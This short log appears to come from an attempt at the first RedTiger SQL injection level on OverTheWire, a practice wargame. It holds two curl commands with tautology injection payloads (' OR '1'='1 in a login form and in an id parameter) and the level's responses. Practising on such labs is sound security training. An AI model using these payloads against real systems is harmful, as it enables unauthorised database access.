content: do an sql injection a this url http://redtiger.labs.overthewire.org/level1.php using curl to build the request

curl -X POST -d "username=' OR '1'='1&password=test" http://redtiger.labs.overthewire.org/level1.php output : Welcome to level 1

Lets start with a simple injection.

Target: Get the login for the user Hornoxe
Hint: You really need one? omg -_-
Tablename: level1_users



Category: 1

curl -s -D - "http://redtiger.labs.overthewire.org/level1.php?id=1\'+OR+1\%3D1--+-" output : HTTP/1.1 200 OK Date: Sun, 28 Jul 2024 19:19:35 GMT Server: Apache Vary: Accept-Encoding Content-Length: 499 Content-Type: text/html; charset=UTF-8 Welcome to level 1
